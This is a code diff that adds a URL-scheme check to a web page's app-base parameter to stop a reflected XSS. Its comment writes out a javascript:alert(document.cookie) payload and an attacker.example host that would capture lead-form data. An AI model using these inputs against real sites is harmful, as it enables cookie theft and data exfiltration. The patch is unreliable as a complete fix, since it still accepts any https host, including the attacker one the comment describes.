@@ -5,10 +5,31 @@
   //   1) ?app=https://app.example.com in the URL
   //   2) window.BKALUT_APP_BASE = "https://app.example.com" set before this script
   //   3) Default: "/app"
+  //
+  // ?app= is attacker-controlled (it comes straight from the URL a visitor
+  // clicked). It gets written into [data-app-target] hrefs below and used to
+  // build the lead-form POST endpoint further down. Without a scheme check,
+  // a shared link like ?app=javascript:alert(document.cookie) would set
+  // every wired app link's href to a javascript: URI that runs in this
+  // page's origin the moment a visitor clicks it — a real reflected XSS.
+  // ?app=https://attacker.example would also redirect lead-form submissions
+  // (name/phone/email) to an attacker-controlled server. Only a relative
+  // path or an http(s) URL is accepted; anything else falls back to the
+  // same default as if ?app= had not been passed at all.
+  function sanitizeAppBase(value) {
+    if (!value) return null;
+    const trimmed = value.replace(/\/+$/, "");
+    if (trimmed.startsWith("/") && !trimmed.startsWith("//")) return trimmed;
+    try {
+      const u = new URL(trimmed, window.location.origin);
+      if (u.protocol === "http:" || u.protocol === "https:") return trimmed;
+    } catch (_) {}
+    return null;
+  }
   function getAppBase() {
     try {
-      const urlParam = new URLSearchParams(window.location.search).get("app");
-      if (urlParam) return urlParam.replace(/\/+$/, "");
+      const urlParam = sanitizeAppBase(new URLSearchParams(window.location.search).get("app"));
+      if (urlParam) return urlParam;
     } catch (_) {}
     if (typeof window.BKALUT_APP_BASE === "string" && window.BKALUT_APP_BASE) {
       return window.BKALUT_APP_BASE.replace(/\/+$/, "");
